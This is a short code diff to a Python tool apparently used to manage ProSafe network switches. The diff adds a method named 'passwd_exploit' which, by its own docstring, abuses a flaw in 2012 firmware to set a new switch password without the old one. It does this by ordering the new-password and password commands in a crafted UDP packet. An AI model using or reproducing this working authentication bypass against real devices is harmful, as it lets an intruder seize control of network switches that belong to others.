@@ -360,6 +360,18 @@ class ProSafeLinux:
         time.sleep(0.7)
         self.recv(func)
 
+    def passwd_exploit(self, mac, new, func):
+        "exploit in current (2012) firmware version, set a a new password"
+        # The Order of the CMD_PASSWORD and CMD_NEW_PASSWORD is important
+        ipadr = self.ip_from_mac(mac)
+        data = self.baseudp(destmac=mac, ctype=self.CTYPE_TRANSMIT_REQUEST)
+        data += self.addudp(self.CMD_NEW_PASSWORD, new)
+        data += self.addudp(self.CMD_PASSWORD, new)
+        data += self.addudp(self.CMD_END)
+        self.send(ipadr, self.SENDPORT, data)
+        time.sleep(0.7)
+        self.recv(func)
+        
     def discover(self):
         "find any switch in the network"
         query_arr = [self.CMD_MODEL,
